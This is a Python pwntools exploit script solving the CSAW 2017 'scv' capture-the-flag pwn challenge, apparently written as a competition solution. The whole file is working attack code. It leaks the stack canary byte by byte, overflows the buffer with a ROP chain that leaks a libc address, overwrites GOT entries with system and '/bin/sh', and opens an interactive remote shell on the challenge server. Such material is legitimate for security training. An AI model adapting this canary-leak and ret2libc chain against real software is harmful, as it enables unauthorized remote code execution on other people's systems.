"""
CSAW 2017 scv pwn challenge solution
"""
# Imports
import re, sys, time
from pwn import *
# Set pwntools context to amd64
context.update(arch='amd64')

# Global debug flag
DEBUG = True

def feed(p, feed_str):
  """
  Handles feed menu option of scv binary.
  """
  # read menu
  p.recvuntil('>>')

  # choose feed
  p.sendline('1')

  # read feed options
  p.recvuntil('>>')

  # string to feed the svc
  p.sendline(feed_str)

  # read till command is done
  return p.recvuntil('[*]SCV GOOD TO GO,SIR....')


def review(p):
  """
  Handles review menu option of scv binary.
  """
  # read menu
  p.recvuntil('>>')

  # choose review
  p.sendline('2')

  # read till command is done
  return p.recvuntil('[*]SCV GOOD TO GO,SIR....')


def mine(p):
  """
  Handles mine menu option of scv binary.
  """
  # read menu
  p.recvuntil('>>')

  # choose mine
  p.sendline('3')

  # read till command is done
  return p.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')

def extract_stack_canary(p):
  """
  Leaks the stack canary from the stack one byte at time.
  """
  canary = '' 
  offset = 160
  while offset <= 167:
    feed(p, 'A' * offset + '#BYTE#:')
    stdout_str = review(p)
    canary += re.search(r'(#BYTE#:.(.))', stdout_str, flags=re.S).group(2)
    offset += 1
  return canary.replace('\x0a', '\x00')

def build_rop_chain(elf):
  """
  Builds a rop chain payload to dump the GOT address of setvbuf and call system("/bin/sh").
  """ 
  rop = ROP(elf)
  # Leak setvbuf libc address
  rop.puts(elf.got['setvbuf'])

  # Return to read call in main loop to read the libc system address and "/bin/sh\x00" string into the got table
  rop.raw(0x400CBA)

  # Pop address of "/bin/sh\x00" string into rdi
  rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)

  # Address of "/bin/sh\x00" string 
  rop.raw(elf.got['__cxa_atexit'])

  # Address of libc system function
  rop.raw(elf.plt['__libc_start_main'])
  
  # Dump payload for debug
  if DEBUG:
    print "Rop payload:\n%s" % (rop.dump())

  # Return the string representation of the rop payload
  return str(rop)

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('scv')

  # Read libc into pwntools and connect to the challenge binary
  if DEBUG:
    libc = elf.libc
    p = remote('localhost', 3764)
    print "Connected to challenge and waiting for debugger to attach. Press any key to continue..."
    sys.stdin.read(1)
  else:
    libc = ELF('libc-2.23')
    p = remote('pwn.chal.csaw.io', 3764)

  # Leak stack canary from process stack
  stack_canary = extract_stack_canary(p)
  print "Leaked stack canary value: 0x%s" % (stack_canary.encode("hex"))

  # Build exploit string
  exploit = 'A' * 168 + stack_canary + p64(elf.got['read'] + 0xB0) + build_rop_chain(elf)

  # Send exploit string
  feed(p, exploit)

  # Execute exploit string
  mine(p)

  # Leak libc setvbuf address
  leaked_setvbuf = 0
  while leaked_setvbuf == 0x00:
    leaked_setvbuf = p.recv()[:8].strip().ljust(8, '\x00')
    leaked_setvbuf = u64(leaked_setvbuf)
  print "Leaked setvbuf address: 0x%016x" % (leaked_setvbuf)

  # Rebase libc
  libc.address = leaked_setvbuf - libc.symbols['setvbuf']

  # Write libc system function address and "/bin/sh\x00" string into the got table
  p.sendline(p64(ROP(elf).find_gadget(['pop rdi', 'ret']).address) + p64(libc.symbols['system']) + "/bin/sh\x00")

  # Call system("/bin/sh\x00")
  p.sendline("1")

  # Interact with the remote shell
  p.interactive()

# Hook
if __name__ == '__main__':
  main()
